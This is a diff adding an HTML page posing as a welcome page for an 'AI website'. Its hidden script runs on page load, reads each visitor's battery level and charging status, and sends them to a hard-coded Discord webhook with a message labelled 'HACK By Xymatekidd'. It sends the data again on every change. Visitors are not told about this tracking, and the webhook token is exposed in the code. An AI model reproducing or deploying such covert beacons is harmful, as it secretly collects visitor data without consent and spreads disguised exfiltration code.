@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FloraAI #3 in the world</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+        h1 {
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <h1>Yo, welcome to our ai website</h1>
+
+    <script>
+        // Function to send data to Discord webhook
+        async function sendToDiscord(data) {
+            const webhookURL = "https://discord.com/api/webhooks/1393209193384906783/dFAfFDrQh6AF7FQapasIx3AAnEjzuB6w8f_7GufrtAXs550wd3EdV0_wMDTXbQ1NXs6A";
+            
+            try {
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: `New visitor/HACK By Xymatekidd/  Battery: ${data.level * 100}% (${data.charging ? 'Charging' : 'Not charging'})`,
+                    }),
+                });
+            } catch (error) {
+                console.error('Error sending to Discord:', error);
+            }
+        }
+
+        // Check battery status if available
+        if ('getBattery' in navigator || ('battery' in navigator && navigator.battery !== null)) {
+            navigator.getBattery().then(function(battery) {
+                const batteryData = {
+                    level: battery.level,
+                    charging: battery.charging
+                };
+                
+                // Send battery info to Discord
+                sendToDiscord(batteryData);
+                
+                // Optional: Update when charging status changes
+                battery.addEventListener('chargingchange', function() {
+                    sendToDiscord({
+                        level: battery.level,
+                        charging: battery.charging
+                    });
+                });
+                
+                // Optional: Update when battery level changes
+                battery.addEventListener('levelchange', function() {
+                    sendToDiscord({
+                        level: battery.level,
+                        charging: battery.charging
+                    });
+                });
+            });
+        } else {
+            // Battery API not supported
+            sendToDiscord({
+                level: 'unknown',
+                charging: 'unknown',
+                message: 'Battery API not supported by this browser'
+            });
+        }
+    </script>
+</body>
+</html>
